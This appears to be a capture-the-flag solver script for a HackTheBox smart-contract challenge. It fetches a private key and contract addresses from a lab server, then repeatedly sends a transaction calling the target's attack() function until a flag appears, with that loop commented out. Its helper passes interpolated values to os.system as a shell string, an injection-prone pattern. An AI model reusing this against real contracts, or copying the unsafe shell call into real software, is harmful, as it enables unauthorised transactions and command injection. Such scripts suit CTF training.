#!/usr/bin/env python
from os import system
from pwn import remote, context, args

context.log_level = "error"


RPC_URL = "http://94.237.50.226:53764/"
TCP_URL = "94.237.50.226:44493"


def csend(contract: str, fn: str, *args):
    print(
        f"cast send {contract} '{fn}' --rpc-url {RPC_URL} --private-key {pvk}")
    system(
        f"cast send {contract} '{fn}' --rpc-url {RPC_URL} --private-key {pvk}")


if __name__ == "__main__":
    connection_info = {}

    # connect to challenge handler and get connection info
    with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
        p.sendlineafter(b"action? ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line:
            key, value = line.strip().split(' :  ')
            connection_info[key] = value

    print(connection_info)
    pvk = connection_info['Private key    ']
    setup = connection_info['Setup contract ']
    target = connection_info['Target contract']

    # while True:
    #     # try luck
    #     csend(target, "attack()")

    #     # get flag
    #     with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
    #         p.recvuntil(b"action? ")
    #         p.sendline(b"3")
    #         flag = p.recvall().decode()

    #     if "HTB" in flag:
    #         print(f"\n\n[*] {flag}")
    #         break
